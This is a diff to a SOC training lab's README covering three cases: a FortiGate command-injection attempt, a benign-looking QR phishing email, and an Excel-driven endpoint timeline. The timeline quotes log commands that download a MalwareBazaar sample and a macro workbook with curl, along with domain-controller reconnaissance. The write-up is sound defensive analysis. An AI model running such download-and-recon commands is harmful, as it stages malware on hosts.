@@ -43,11 +43,9 @@ The investigation focuses on what the evidence proves, what remains unconfirmed,
 
 ## Case 1 - FortiGate Command Injection
 
-The first case starts with a FortiGate IPS event. An external source, `195.1.144.109`, sends an HTTP request to the public web service `web.seesec.co.il`. The important part is not only the connection itself, but the content of the URL: it contains shell-style syntax and a full command chain.
+The first case starts with a FortiGate IPS event: external source `195.1.144.109` sends an HTTP request to the public web service `web.seesec.co.il`. The URL is the key evidence because it contains shell-style syntax and a full command chain.
 
-This looks like an automated exploitation attempt. The request tries to abuse a LuCI-style path, move into `/tmp`, remove an older file, download a file named `shk`, give it executable permissions, run it with a `tplink` argument, and delete it afterward to reduce traces.
-
-From an analyst perspective, this case has three separate layers. The first layer is the incoming request from the internet-facing source. The second layer is the command string embedded in the URL. The third layer is the payload infrastructure that the target would contact if the injected command executed successfully. Keeping those layers separate prevents the investigation from mixing up the scanner, the protected web service, and the download host.
+The request looks like automated exploitation. It abuses a LuCI-style path, moves into `/tmp`, removes any old `shk` file, downloads a new payload, makes it executable, runs it with a `tplink` argument, and deletes it afterward. I keep the source, target, and payload host separate because each one answers a different question: who sent the request, what was targeted, and where the target would download from if execution succeeded.
 
 > Command injection means attacker-controlled input reaches an operating-system shell. In this event, the network log proves that the request was sent to the web service. It does not prove by itself that the target server executed the command.
 
@@ -204,11 +202,11 @@ The key validation should include web server access logs, error logs, applicatio
 
 ## Case 2 - Quishing Email
 
-The second case starts as a QR-code phishing investigation. The email asks the recipient to scan a QR code and join a Facebook group. QR codes deserve caution in SOC triage because the real destination is hidden until the code is decoded or opened in a controlled environment.
+The second case starts as a QR-code phishing investigation. The email asks the recipient to scan a QR code and join a Facebook group, which deserves caution because the real destination is hidden until the QR code is decoded or opened in a controlled environment.
 
-After Any.Run/sandbox and PCAP validation, the evidence supports a likely false positive for confirmed phishing. The QR code uses an ad-supported Me-QR redirect page, but the observed path leads to the legitimate Facebook domain instead of a fake credential-harvesting page. The email still has weak signals that justify investigation: the sender display name is written incorrectly, the QR code hides the destination, and full email headers are not available.
+After Any.Run/sandbox and PCAP validation, the evidence supports a likely false positive for confirmed phishing. The QR code uses an ad-supported Me-QR redirect page, but the observed path reaches the legitimate Facebook domain instead of a fake credential-harvesting page. The email still has weak signals that justify triage: the sender display name is written incorrectly, the QR code hides the destination, and full email headers are unavailable.
 
-Quishing means QR-code phishing. The technique is attractive to attackers because a QR image can push the user from a protected email client to a mobile browser, where link inspection, corporate proxy controls, and user awareness can be weaker. In this case, the suspicious delivery method creates the alert, but the final verdict depends on the decoded URL, redirect behavior, network evidence, and sender validation.
+Quishing means QR-code phishing. Attackers use it because a QR image can move the user from a protected email client to a browser or mobile device, where inspection and user awareness may be weaker. Here, the delivery method is suspicious, but the verdict depends on the decoded URL, redirect behavior, network evidence, and sender validation.
 
 > The alert remains valuable as a triage signal. The suspicious delivery method justified investigation, while the validated evidence does not support a malicious phishing verdict.
 
@@ -229,9 +227,7 @@ The email uses a simple request: scan the QR code and join a Facebook group. Thi
 
 <p><sub><strong>Screenshot 010 - Suspicious email with QR code:</strong> The email contains sender and recipient details plus a QR code that asks the user to follow an external path.</sub></p>
 
-The screenshot shows a social-engineering style request rather than a technical exploit. The user is being asked to take an action outside the email body: scan the QR code and continue in a browser. That behavior is why the case cannot be closed from the email screenshot alone. The QR image must be decoded and followed in a controlled environment before deciding whether it leads to a real phishing page, a benign group invite, or an intermediate redirect service.
-
-The lure is suspicious enough for triage because the destination is hidden from normal visual inspection. At the same time, the screenshot does not show a fake login page, attachment, malicious file, or credential prompt. It only shows the initial delivery object.
+The screenshot shows a social-engineering request, not a technical exploit. The user is asked to scan the QR code and continue outside the email body, so the case cannot be closed from the email alone. The QR image must be decoded and tested in a controlled environment before deciding whether it leads to phishing, a benign group invite, or an intermediate redirect service.
 
 ### Validate the Sender Identity
 
@@ -255,9 +251,7 @@ The QR code resolves to `https://qr.me-qr.com/shP847fW`. This is an intermediate
 
 <p><sub><strong>Screenshot 012 - Security vendor detections for QR URL:</strong> The decoded QR URL is checked against security vendors and receives malicious or suspicious detections.</sub></p>
 
-The reputation result is useful, but it should not be treated as the final answer. QR redirect services can receive negative reputation because they are abused by other users or because they show ad-gated redirect behavior. The important analyst question is not only "is the QR provider suspicious?" but "where did this specific QR link send the user during controlled testing?"
-
-The decoded URL also explains why the alert is plausible. A user expecting Facebook does not initially go straight to `facebook.com`; the path starts with a third-party QR service. That adds uncertainty because redirect services can change destinations after delivery, hide the final URL from the email body, and make security tooling evaluate the intermediate service instead of the final page.
+The reputation result is useful, but it is not the final answer. QR redirect services can receive negative reputation because they are abused by other users or because they show ad-gated redirect behavior. The analyst question is whether this specific QR link led to a fake page, a payload, or a legitimate destination during controlled testing.
 
 ### Validate QR Behavior in Sandbox and PCAP Evidence
 
@@ -267,7 +261,7 @@ The Any.Run/sandbox browser evidence shows the Me-QR intermediate page. The page
 
 <p><sub><strong>Screenshot 013 - Me-QR ad gate after QR scan:</strong> The QR link opens an intermediate Me-QR page that requires watching or skipping an ad before continuing.</sub></p>
 
-This page may look suspicious because it interrupts the user with an ad-gated redirect, but it is not the same as credential phishing. It does not show a fake Microsoft, Facebook, bank, or corporate login page. That distinction matters: some suspicious-looking web flows are advertising or tracking flows rather than credential theft.
+This page may look suspicious because it interrupts the user with an ad-gated redirect, but it is not the same as credential phishing. It does not show a fake Microsoft, Facebook, bank, or corporate login page.
 
 The final observed destination is `https://www.facebook.com/?locale=he_IL`, which is a legitimate Facebook domain. This supports a benign explanation: the QR code likely redirects through Me-QR to Facebook rather than to a fake login page.
 
@@ -275,7 +269,7 @@ The final observed destination is `https://www.facebook.com/?locale=he_IL`, whic
 
 <p><sub><strong>Screenshot 014 - Facebook final destination:</strong> The redirect flow reaches the legitimate `www.facebook.com` login page using the Hebrew locale.</sub></p>
 
-The final page is still a login page, so the analyst should verify the domain carefully. In the screenshot, the browser reaches `www.facebook.com`, which is the real Facebook domain. A fake page would normally use a lookalike domain, unusual subdomain, newly registered host, or non-Meta infrastructure. The available browser evidence supports a legitimate Facebook destination.
+The final page is still a login page, so the domain must be checked carefully. In the screenshot, the browser reaches `www.facebook.com`, the real Facebook domain. A fake page would normally use a lookalike domain, unusual subdomain, newly registered host, or non-Meta infrastructure.
 
 The PCAP supports the same conclusion. The capture contains DNS and TLS indicators for `qr.me-qr.com`, `cdn.me-qr.com`, Google ad/measurement domains, and then Facebook/Meta infrastructure such as `www.facebook.com`, `static.xx.fbcdn.net`, `scontent.xx.fbcdn.net`, and `accounts.meta.com`. No separate counterfeit Facebook domain or malware download is visible in the network evidence. A compact domain summary is documented in [quishing-network-evidence.md](docs/quishing-network-evidence.md).
 
@@ -473,11 +467,9 @@ Cleanup tools are not automatically malicious. The reason they matter here is ti
 
 ### Review Internal Checks and External Downloads
 
-This part of the timeline moves beyond user discovery and shows two additional behaviors: internal reachability checks and file downloads. Together, they matter because they can show how an operator or script checks the environment and then pulls external content onto the endpoint.
+This part of the timeline adds two behaviors: internal reachability checks and file-transfer activity. `ping` tests whether internal hosts respond, while `curl -o` downloads remote content to a chosen local filename. Both tools are legitimate, but here they appear beside Excel-driven discovery and downloaded Office content.
 
-`ping` is a basic network test that sends ICMP echo requests to check whether a host responds. `curl` is a command-line transfer tool that can download content from a URL; with `-o`, the downloaded content is written to a local filename. Both tools are legitimate, but in this timeline they appear near Excel-driven discovery and downloaded Office content, so they need to be reviewed as part of the same investigation.
-
-> A single `ping` or `curl` command can be normal. The concern here is the sequence: Excel opens `Gift.xlsm`, `whoami` runs from Excel, internal systems are checked, and external files are downloaded with command-line tools.
+> The concern is the sequence, not one command: Excel opens `Gift.xlsm`, `whoami` runs from Excel, internal systems are checked, and external files are downloaded with command-line tools.
 
 ![Recon and process timeline](images/03-sentinel-sysmon/recon-and-process-timeline.png)
 
@@ -492,9 +484,7 @@ ping dc.local.course
 whoami
 ```
 
-`dc` and `dc.local.course` point to a domain-controller naming pattern, while `10.10.10.10` looks like an internal lab IP address. This activity can happen during troubleshooting, but in a SOC investigation it also fits internal reconnaissance: checking whether the domain controller is reachable, whether DNS resolves the short and full names, and whether the current user context is useful for the next step.
-
-The screenshot does not prove lateral movement by itself. It proves that the endpoint ran internal reachability checks in the same broader timeline as suspicious Excel and `whoami` activity.
+`dc` and `dc.local.course` point to a domain-controller naming pattern, while `10.10.10.10` looks like an internal lab IP address. This can happen during troubleshooting, but in this timeline it also fits internal reconnaissance: checking domain-controller reachability, DNS resolution, and the current user context before a next step. The screenshot does not prove lateral movement; it proves internal reachability checks near suspicious Excel and `whoami` activity.
 
 ![Curl download and ping activity](images/03-sentinel-sysmon/curl-download-and-ping-activity.png)
 
@@ -506,25 +496,23 @@ The second visible group is external file transfer:
 curl -o cmd.xex https://bazaar.abuse.ch/download/69583b9a85076bf1690ef00fceeb77ac998a991375d8ee809ec2fa037f09f3e4/
 ```
 
-The command downloads content from `bazaar.abuse.ch` and writes it locally as `cmd.xex`. This already looks suspicious: the endpoint appears to be pulling a malware sample-like object from a malware-research/sample-sharing platform and saving it under a name that resembles the legitimate Windows command interpreter `cmd.exe`.
+The command downloads content from `bazaar.abuse.ch` and saves it as `cmd.xex`. That is suspicious because the endpoint appears to pull a sample-like object from a malware-research platform and store it under a name that resembles the legitimate Windows command interpreter `cmd.exe`.
 
-This pattern can be read as two behaviors at the same time. The download itself maps well to [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) because an external file is being brought onto the host with `curl`. The filename choice also resembles [MITRE ATT&CK T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/) because `cmd.xex` looks intentionally close to `cmd.exe`, a trusted Windows binary, while still being a different file. That is common in Trojan-style delivery: a suspicious payload is given a familiar-looking name so it blends into normal Windows activity.
+The behavior maps to [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) because `curl` brings an external file onto the host. The filename also resembles [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/): `cmd.xex` is close to `cmd.exe` but is a different file. That pattern is common in Trojan-style delivery, where a suspicious payload receives a familiar-looking name.
 
-`bazaar.abuse.ch` is associated with MalwareBazaar, an abuse.ch project used by malware researchers and defenders to share malware samples and related intelligence. The site itself is a legitimate research platform, but downloading from its `/download/` path means the endpoint is attempting to retrieve a sample-like object. In a normal user workstation timeline, that is a high-signal event.
-
-The available screenshot confirms the download command, but it does not confirm whether `cmd.xex` successfully downloaded, what hash was written to disk, or whether the file executed afterward. Those points require endpoint file collection, hash review, and process execution telemetry before calling the payload confirmed malware execution.
+`bazaar.abuse.ch` is associated with MalwareBazaar, an abuse.ch project used by researchers and defenders to share malware samples and intelligence. The site itself is legitimate for research, but a user endpoint downloading from its `/download/` path is high-signal activity. The screenshot confirms the command, but file collection, hashing, and execution telemetry are still needed to prove whether `cmd.xex` downloaded or executed.
 
 ![VirusTotal detection for bazaar.abuse.ch](images/03-sentinel-sysmon/virustotal-bazaar-abuse-domain-detection.png)
 
 <p><sub><strong>Screenshot 025 - VirusTotal domain detection for bazaar.abuse.ch:</strong> VirusTotal shows the `bazaar.abuse.ch` domain with a low vendor-detection count, while the community context still treats it as malware-related infrastructure.</sub></p>
 
-The VirusTotal result should be interpreted carefully. A low detection ratio for the domain does not make the endpoint command safe, because MalwareBazaar is a known research and sample-sharing service rather than a random phishing domain. The stronger signal is the endpoint behavior: `curl` is pulling a `/download/` URL and saving it as an executable-looking file.
+The VirusTotal result needs context. A low domain-detection ratio does not make the endpoint command safe because the stronger signal is behavioral: `curl` is pulling a `/download/` URL from MalwareBazaar-style infrastructure and saving it as an executable-looking file.
 
 ### Investigate `Gift.xlsm`
 
-`Gift.xlsm` becomes one of the most important artifacts in this case because it appears repeatedly in the same endpoint timeline as `whoami`, internal network checks, `curl` downloads, and cleanup-related commands. The file extension matters: `.xlsm` is a macro-enabled Excel workbook, which means the document can contain VBA macro logic. In normal business use, macros can automate calculations or reports. In an incident investigation, the same capability is risky because macros can also launch command-line tools, download additional files, run discovery commands, or prepare the next stage of an attack.
+`Gift.xlsm` is the key artifact because it appears repeatedly beside `whoami`, internal checks, `curl` downloads, and cleanup-related commands. The `.xlsm` extension matters because macro-enabled workbooks can contain VBA logic. In normal use, macros automate spreadsheet tasks; in an incident, they can launch commands, download content, run discovery, or stage the next action.
 
-The available evidence does not include the original `Gift.xlsm` file, its hash, or its macro source code. Because of that, the investigation cannot honestly prove what the workbook contains internally. The conclusion here is based on behavior: Excel opens the workbook multiple times, Excel is tied to repeated `whoami` execution, and the same timeline contains external downloads and internal reachability checks. That combination makes `Gift.xlsm` a strong suspect, even before static or sandbox analysis is available.
+The workbook itself, hash, and macro code are not available, so its contents cannot be confirmed. The suspicion is behavioral: Excel opens `Gift.xlsm` multiple times, Excel is tied to repeated `whoami`, and the same timeline includes external downloads and internal reachability checks.
 
 ![Repeated Gift.xlsm downloads](images/03-sentinel-sysmon/repeated-gift-xlsm-downloads.png)
 
@@ -536,43 +524,41 @@ The repeated command is:
 curl -o Gift.xlsm https://file.io/atAOsYothaq0
 ```
 
-This command tells the endpoint to download content from `file.io` and save it locally as `Gift.xlsm`. That does not automatically make `file.io` malicious. `file.io` is a temporary file-sharing service, and legitimate users can use it to transfer files. The risk comes from how it appears in this timeline: a macro-enabled workbook is being retrieved through a temporary hosting link instead of a trusted internal share, official software portal, email attachment record, or managed storage system.
+This command downloads content from `file.io` and saves it locally as `Gift.xlsm`. `file.io` is not malicious by default; it is a temporary file-sharing service. The risk is the context: a macro-enabled workbook is retrieved from temporary hosting instead of a trusted internal share, official software portal, email attachment record, or managed storage system.
 
-Temporary file-sharing services are frequently useful to attackers because links can be short-lived, payloads can be replaced or removed, and defenders may not always have the original file by the time the alert is reviewed. In this lab, the workbook is unavailable for direct collection, so the main question becomes behavioral: why is a user endpoint downloading a macro-enabled workbook from temporary hosting, opening it through Excel, and then producing discovery-style process activity?
+Temporary hosting is useful to attackers because links can be short-lived, payloads can be replaced, and defenders may lose access to the original file. Since the workbook is unavailable for collection, the investigation relies on behavior: a user endpoint downloads a macro-enabled workbook, opens it through Excel, and then shows discovery-style process activity.
 
 ![VirusTotal community context for file.io](images/03-sentinel-sysmon/virustotal-file-io-community-context.png)
 
 <p><sub><strong>Screenshot 027 - VirusTotal community context for file.io:</strong> The community notes describe `file.io` as not necessarily malicious by itself, but also mention its use as a payload-hosting or downloader location in real threat-reporting context.</sub></p>
 
-The VirusTotal community context supports a careful interpretation. The domain itself should not be treated as malicious only because it appears in the log. At the same time, community notes connect `file.io` with payload distribution and prior reporting around malware families and intrusion activity such as DarkGate, SystemBC, Zeus, and Black Basta-related campaigns. That makes `file.io` a domain that needs context-based analysis: clean domain reputation alone is not enough when the command downloads a macro-enabled workbook during a suspicious endpoint sequence.
+The VirusTotal community context supports a careful interpretation. `file.io` should not be treated as malicious only because it appears in the log, but community notes connect it with payload distribution and prior reporting around malware families and intrusion activity such as DarkGate, SystemBC, Zeus, and Black Basta-related campaigns.
 
-In this case, `file.io` is best treated as possible delivery or staging infrastructure. The downloaded object is not a harmless text file or image; it is an Office workbook format that can execute macros if the user enables content or if policy is weak. The filename `Gift.xlsm` is also socially meaningful. A "gift" themed document can be used as bait because it looks personal, unexpected, and easy for a user to open without thinking deeply about the source.
+In this case, `file.io` is best treated as possible delivery or staging infrastructure. The downloaded object is a macro-enabled Office workbook, not a harmless text file or image, and the `Gift.xlsm` name looks like a simple social-engineering lure.
 
 ![Gift.xlsm Excel execution timeline](images/03-sentinel-sysmon/gift-xlsm-excel-execution-timeline.png)
 
 <p><sub><strong>Screenshot 028 - Gift.xlsm Excel execution timeline:</strong> Excel opens `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` multiple times around 8:32 AM, 8:51 AM, and 8:52 AM.</sub></p>
 
-This screenshot shows that Jim's endpoint did not interact with the workbook only once. Excel opens the same workbook from the user's desktop several times. Repeated openings can happen during normal use, but here the surrounding behavior matters: the same case also contains `whoami` execution from Excel, internal host checks, and command-line downloads. For a SOC analyst, repeated Office execution makes the workbook a priority artifact because it may be the document that started or repeated the suspicious activity.
-
-The path is also important: `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` means the workbook is in Jim's user profile rather than a protected application directory. User-profile locations are commonly used by downloaded files, email attachments, browser downloads, and manually copied files. That supports the idea that Jim likely interacted with the file as a user-level object, not as a managed enterprise application.
+Jim's endpoint opens the workbook several times from `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm`. Repeated openings can be normal, but here they appear beside Excel-launched `whoami`, internal host checks, and command-line downloads. The user-profile path also suggests the file behaved like a user-delivered object, not a managed enterprise application.
 
 ![Extended Gift.xlsm timeline](images/03-sentinel-sysmon/extended-gift-xlsm-timeline.png)
 
 <p><sub><strong>Screenshot 029 - Extended Gift.xlsm timeline:</strong> The extended view shows more Excel executions of `Gift.xlsm` around 9:02 AM and 9:03 AM, followed by repeated `curl -o Gift.xlsm` downloads around 12:07 PM.</sub></p>
 
-The extended timeline strengthens the pattern. The workbook appears earlier as an executed Office document and later as a downloaded file through `curl`. That can mean several things: the user may have re-downloaded the file, a script may have re-staged it, or another command sequence may have attempted to refresh the workbook from the temporary URL. Without the file and full command history, the exact reason cannot be proven. Still, the pattern is not clean administrative behavior. A normal user workflow usually does not require repeated command-line downloads of a macro-enabled workbook from a temporary file host.
+The extended timeline shows the workbook first as an executed Office document and later as a `curl` download. The exact reason is not proven without the file and full command history, but the pattern is not clean administrative behavior. A normal user workflow rarely requires repeated command-line downloads of a macro-enabled workbook from temporary hosting.
 
-This is why the investigation should separate two questions. First, was the domain `file.io` itself malicious? Not necessarily. Second, is this endpoint behavior suspicious? Yes. The suspicious part is the combination of temporary hosting, macro-enabled Office content, repeated execution, Excel-parented discovery, and later download activity.
+The key distinction is simple: `file.io` is not automatically malicious, but this endpoint behavior is suspicious because it combines temporary hosting, macro-enabled Office content, repeated execution, Excel-parented discovery, and later download activity.
 
 ![Combined whoami and Gift.xlsm timeline](images/03-sentinel-sysmon/combined-whoami-gift-timeline.png)
 
 <p><sub><strong>Screenshot 030 - Combined whoami and Gift.xlsm timeline:</strong> The combined timeline links Excel opening `Gift.xlsm`, `splwow64.exe`, repeated `whoami`, and later Excel execution of the same workbook.</sub></p>
 
-This combined view is the strongest behavioral link in the case. `whoami` is a simple discovery command that prints the current user context. It is not malicious by itself. The problem is that several `whoami` events are connected to Excel and to `Gift.xlsm`. A normal spreadsheet usually has no reason to launch identity-discovery commands. Malware, droppers, and malicious macros often perform this kind of check to understand which user is running the payload, whether the session belongs to a domain user, and whether the environment is worth continuing in.
+This combined view is the strongest behavioral link in the case. `whoami` is not malicious by itself, but several executions are connected to Excel and `Gift.xlsm`. A normal spreadsheet usually has no reason to launch identity-discovery commands; malicious macros and droppers often do this to learn which user and environment they are running under.
 
-The timeline also includes `splwow64.exe`, which is a legitimate Windows process related to printing support for 32-bit applications on 64-bit systems. Its presence does not prove malicious behavior by itself. In this case it is simply part of the broader Office/process timeline. The priority remains the unusual chain: Jim opens a macro-enabled workbook, Excel appears as a parent process, discovery commands run, internal systems are checked, and external file transfers occur.
+The timeline also includes `splwow64.exe`, a legitimate Windows process related to printing support for 32-bit applications on 64-bit systems. Its presence does not prove malicious behavior. The priority remains the unusual chain: Jim opens a macro-enabled workbook, Excel appears as a parent process, discovery commands run, internal systems are checked, and external file transfers occur.
 
-My assessment of `Gift.xlsm`: it should be treated as the likely central execution or staging artifact in Case 3. It cannot be labeled confirmed malware without collecting the workbook, extracting macros, calculating hashes, and detonating it in a controlled sandbox. However, from a SOC perspective it is suspicious enough to justify containment, file preservation, and escalation. The workbook behaves like a possible first-stage document or downloader: it is delivered from temporary hosting, opened through Excel, and associated with discovery and transfer activity.
+My assessment: `Gift.xlsm` should be treated as the likely central execution or staging artifact in Case 3. It cannot be labeled confirmed malware without the workbook, macro extraction, hashes, and sandbox execution, but it is suspicious enough to justify containment, file preservation, and escalation.
 
 > The conclusion is behavioral, not file-reputation based. Excel and `Gift.xlsm` appear in a suspicious chain with user discovery, internal reachability checks, external downloads, and cleanup-related activity.
 
@@ -599,9 +585,9 @@ My assessment of `Gift.xlsm`: it should be treated as the likely central executi
 
 ## Final Summary
 
-This lab demonstrates how a SOC analyst can move from alert data to supported investigation conclusions. The FortiGate case is a true-positive exploitation attempt with Mirai-related payload context, but server-side logs are required before confirming compromise. The QR email case shows how a suspicious QR redirect can become a false positive after Any.Run/sandbox and PCAP validation: the flow reaches legitimate Facebook infrastructure, while sender/header questions still require validation. The Sentinel/Sysmon case shows how field-level process telemetry changes the verdict: Jim's endpoint repeatedly opens `Gift.xlsm`, runs Excel-linked discovery, retrieves a macro-enabled workbook from `file.io`, reaches toward MalwareBazaar-style download activity, checks domain-controller targets, and shows cleanup artifacts. That full chain makes the endpoint activity suspicious even without direct access to the original workbook.
+This lab shows how SOC triage moves from alert data to evidence-supported conclusions. Case 1 is a true-positive exploitation attempt with Mirai-related payload context, but compromise requires server-side proof. Case 2 is likely a false positive for confirmed phishing because the QR flow reaches legitimate Facebook/Meta infrastructure, while sender/header validation remains open. Case 3 is a suspicious endpoint incident: `Gift.xlsm`, Excel-linked `whoami`, `file.io` downloads, MalwareBazaar-style transfer activity, domain-controller checks, and cleanup artifacts form a credible chain even without the original workbook.
 
-Across all three cases, the key discipline is evidence control: document what is confirmed, avoid unsupported conclusions, map behavior accurately, and define the next telemetry needed to prove or disprove impact.
+Across all cases, the discipline is the same: state what is confirmed, mark what is not, map behavior accurately, and define the telemetry needed to prove impact.
 
 ## Recommendations
 
@@ -629,7 +615,7 @@ Across all three cases, the key discipline is evidence control: document what is
 ## Repository Structure
 
 ```text
-quishing-soc-alert-investigation-lab/
+soc-alert-investigation-lab/
 |-- README.md
 |-- LICENSE
 |-- IMAGE_MANIFEST.md
